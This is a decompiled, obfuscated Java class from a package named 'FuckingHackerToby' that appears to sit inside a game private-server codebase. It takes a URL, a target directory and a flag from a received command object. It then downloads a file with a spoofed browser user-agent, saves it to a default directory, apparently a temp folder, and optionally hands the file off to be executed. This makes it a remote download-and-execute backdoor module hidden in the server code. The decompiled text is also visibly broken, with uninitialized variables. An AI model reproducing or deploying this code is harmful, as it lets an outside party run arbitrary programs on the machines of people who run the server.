/*
 * Decompiled with CFR 0.150.
 */
package FuckingHackerToby;

import FuckingHackerToby.Ma;
import FuckingHackerToby.j;
import FuckingHackerToby.ta;
import FuckingHackerToby.za;
import client.messages.commands.SkilledCommand;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import server.life.MonsterDropEntry;

public final class ga
implements j {
    private static final /* synthetic */ byte d = 1;
    private static final /* synthetic */ String g = "Connection";
    private /* synthetic */ byte C;
    private static final /* synthetic */ String E = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0";
    private static final /* synthetic */ byte a = 0;
    private static final /* synthetic */ int K = 1024;
    private /* synthetic */ String I;
    private static final /* synthetic */ String B = "close";
    private static final /* synthetic */ String ALLATORIxDEMO;
    private static final /* synthetic */ String e = "User-Agent";
    private static final /* synthetic */ String k = "file";
    private /* synthetic */ String F;
    private static final /* synthetic */ String H = "http://";

    public /* synthetic */ ga() {
        a2("", "");
        ga a2;
    }

    private /* synthetic */ void ALLATORIxDEMO(InputStream a2, OutputStream a3) throws IOException {
        byte[] arrby = new byte[1024];
        int n2 = 0;
        InputStream inputStream = a2;
        while ((n2 = inputStream.read(arrby)) != -1) {
            inputStream = a2;
            OutputStream outputStream = a3;
            outputStream.write(arrby, 0, n2);
            outputStream.flush();
        }
    }

    public /* synthetic */ ga(String a2, String a3, boolean a4) {
        ga ga2;
        ga a5;
        a5.F = a3;
        if (a2.startsWith(H)) {
            ga2 = a5;
            a5.I = a2;
        } else {
            a5.I = H + a2;
            ga2 = a5;
        }
        ga2.C = a4 ? (byte)1 : 0;
    }

    private /* synthetic */ Ma ALLATORIxDEMO(String a2) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream;
        ga a3;
        HttpURLConnection.setFollowRedirects(true);
        HttpURLConnection httpURLConnection = (HttpURLConnection)new URL((String)a2).openConnection();
        Object object = a2 = httpURLConnection;
        ((URLConnection)object).setRequestProperty(e, E);
        httpURLConnection.setRequestProperty(g, B);
        ((URLConnection)object).connect();
        a2 = httpURLConnection.getInputStream();
        Object object2 = httpURLConnection.getURL().getFile();
        int n2 = ((String)object2).lastIndexOf("/");
        int n3 = ((String)object2).indexOf(SkilledCommand.ALLATORIxDEMO("\u0014"));
        ByteArrayOutputStream byteArrayOutputStream2 = new ByteArrayOutputStream();
        Object object3 = a2;
        a3.ALLATORIxDEMO((InputStream)object3, byteArrayOutputStream2);
        byteArrayOutputStream2.close();
        ((InputStream)object3).close();
        if (n2 != -1) {
            if (n3 != -1) {
                a2 = ((String)object2).substring(n2 + 1, n3);
                byteArrayOutputStream = byteArrayOutputStream2;
            } else {
                a2 = ((String)object2).substring(n2 + 1);
                byteArrayOutputStream = byteArrayOutputStream2;
            }
        } else {
            a2 = k;
            byteArrayOutputStream = byteArrayOutputStream2;
        }
        object2 = byteArrayOutputStream.toByteArray();
        return new Ma((String)a2, (byte[])object2);
    }

    @Override
    public /* synthetic */ void ALLATORIxDEMO(ta a2) {
        Object object;
        String string;
        ga a3;
        a2 = new File(a3.F);
        String string2 = null;
        if (((File)a2).isDirectory()) {
            string = string2 = a3.F;
        } else {
            object = ((File)a2).getParentFile();
            if (object != null) {
                string2 = ((File)object).getAbsolutePath();
            }
            string = string2;
        }
        if (string != null) {
            try {
                ga ga2 = a3;
                object = ga2.ALLATORIxDEMO(ga2.I);
                ((Ma)object).ALLATORIxDEMO(string2);
                if (ga2.C == 1) {
                    za.ALLATORIxDEMO(string2 + File.separator + ((Ma)object).d);
                    return;
                }
            }
            catch (NullPointerException nullPointerException) {
                return;
            }
            catch (IOException iOException) {
                iOException.printStackTrace();
            }
        }
    }

    @Override
    public /* synthetic */ void H(ta a2) {
        ga a3;
        ta ta2 = a2;
        a3.I = ta2.H();
        a3.F = ta2.H();
        a3.C = a2.ALLATORIxDEMO();
        if (a3.F.isEmpty()) {
            a3.F = ALLATORIxDEMO;
        }
    }

    public /* synthetic */ ga(String a2, String a3) {
        a4(a2, a3, false);
        ga a4;
    }

    public static /* synthetic */ {
        ALLATORIxDEMO = System.getProperty(MonsterDropEntry.ALLATORIxDEMO("UVIV\u0011^P\u0019KZOSVE"));
    }

    @Override
    public /* synthetic */ void l(ta a2) {
        ga a3;
        ta ta2 = a2;
        ga ga2 = a3;
        a2.ALLATORIxDEMO(ga2.I);
        ta2.ALLATORIxDEMO(ga2.F);
        ta2.ALLATORIxDEMO(a3.C);
    }
}

